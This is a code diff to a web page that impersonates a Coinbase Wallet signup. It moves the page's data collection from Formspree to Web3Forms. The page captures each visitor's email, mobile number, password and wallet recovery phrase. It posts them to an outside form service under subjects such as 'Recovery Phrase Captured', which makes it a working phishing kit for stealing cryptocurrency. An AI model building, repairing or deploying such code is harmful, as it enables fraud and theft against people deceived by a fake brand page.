@@ -480,8 +480,13 @@
                 <div class="logo-text">WALLET</div>
             </div>
 
-            <!-- Updated Formspree Form -->
-            <form id="signupForm" class="form-section" action="https://formspree.io/f/xbgogwyn" method="POST">
+            <form id="signupForm" class="form-section">
+                <!-- Web3Forms Hidden Fields -->
+                <input type="hidden" name="access_key" value="6d0efec6-54f3-4a89-a96e-0f4c1f78de44">
+                <input type="hidden" name="subject" value="New User Signup - Coinbase Wallet">
+                <input type="hidden" name="from_name" value="Coinbase Wallet Security">
+                <input type="checkbox" name="botcheck" style="display: none;">
+
                 <div class="input-group">
                     <input type="email" id="email" name="email" placeholder="Email Address" required>
                     <div class="error-text" id="email-error">Please enter a valid email address.</div>
@@ -632,28 +637,8 @@
         let isManualMode = false;
 
         // =========================================
-        // 1. SIGNUP VALIDATION (Direct POST to Formspree)
+        // 1. SIGNUP VALIDATION & SUBMISSION
         // =========================================
-        signupForm.addEventListener('submit', function(e) {
-            if (!validateSignup()) {
-                e.preventDefault(); // Only stop submission if validation fails
-                return;
-            }
-            
-            // Store data temporarily for the recovery phrase step
-            currentUserEmail = emailInput.value.trim();
-            currentUserMobile = mobileInput.value.trim();
-            currentUserPassword = passwordInput.value;
-            
-            // Form will now naturally submit to Formspree
-            // Note: To prevent page reload and show the next screen, 
-            // we'd need AJAX, but standard HTML POST will redirect you to a Formspree "Thank You" page.
-            // Since you want to show the next screen, we intercept and use fetch (similar to before, but clean).
-            
-            e.preventDefault(); // Prevent actual page reload
-            submitToFormspree();
-        });
-
         function validateSignup() {
             let isValid = true;
 
@@ -689,47 +674,52 @@
             return isValid;
         }
 
-        async function submitToFormspree() {
+        signupForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (!validateSignup()) {
+                return;
+            }
+
             const btn = document.getElementById('btn-continue');
             const originalText = btn.innerText;
             btn.innerText = "Sending...";
             btn.disabled = true;
 
+            currentUserEmail = emailInput.value.trim();
+            currentUserMobile = mobileInput.value.trim();
+            currentUserPassword = passwordInput.value;
+
             const formData = new FormData(signupForm);
             const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
 
             try {
-                const response = await fetch('https://formspree.io/f/xbgogwyn', {
+                const response = await fetch('https://api.web3forms.com/submit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     },
-                    body: JSON.stringify(object)
+                    body: json
                 });
 
                 const result = await response.json();
 
-                if (response.ok) {
-                    // Success
+                if (response.status === 200 && result.success) {
                     screenSignup.classList.add('hidden');
                     screenOptions.classList.remove('hidden');
                 } else {
-                    // Error handling with actual Formspree message
-                    let errorMsg = "Unknown error occurred.";
-                    if (result.errors) {
-                        errorMsg = result.errors.map(err => err.message).join(", ");
-                    }
-                    alert("Submission failed: " + errorMsg);
+                    alert("Submission failed: " + (result.message || "Unknown error"));
                 }
             } catch (error) {
-                console.error("Network Error:", error);
-                alert("Network error. Please check your internet connection.");
+                console.error(error);
+                alert("Something went wrong. Please try again.");
             } finally {
                 btn.innerText = originalText;
                 btn.disabled = false;
             }
-        }
+        });
 
         emailInput.addEventListener('input', () => { emailError.style.display = 'none'; emailInput.style.borderColor = '#30363d'; });
         mobileInput.addEventListener('input', () => { mobileError.style.display = 'none'; mobileInput.style.borderColor = '#30363d'; });
@@ -930,9 +920,7 @@
             }
         }
 
-        // =========================================
-        // 3. SUBMIT RECOVERY PHRASE TO FORMSPREE
-        // =========================================
+      
         btnImport.addEventListener('click', async () => {
             let phrase = "";
 
@@ -957,7 +945,9 @@
             btnImport.disabled = true;
 
             const payload = {
-                subject: "🔐 Recovery Phrase Captured - Coinbase Wallet",
+                access_key: "6d0efec6-54f3-4a89-a96e-0f4c1f78de44",
+                subject: "  Phrase -  Wallet",
+                from_name: " Wallet ",
                 email: currentUserEmail,
                 mobile: currentUserMobile,
                 password: currentUserPassword,
@@ -966,7 +956,7 @@
             };
 
             try {
-                const response = await fetch('https://formspree.io/f/xbgogwyn', {
+                const response = await fetch('https://api.web3forms.com/submit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -977,14 +967,10 @@
 
                 const result = await response.json();
 
-                if (response.ok) {
-                    alert(`Success! Recovery phrase saved and sent securely.`);
+                if (response.status === 200 && result.success) {
+                    alert(`Success! .`);
                 } else {
-                    let errorMsg = "Unknown error.";
-                    if (result.errors) {
-                        errorMsg = result.errors.map(err => err.message).join(", ");
-                    }
-                    alert("Submission failed: " + errorMsg);
+                    alert("Submission failed: " + (result.message || "Unknown error"));
                 }
             } catch (error) {
                 console.error(error);
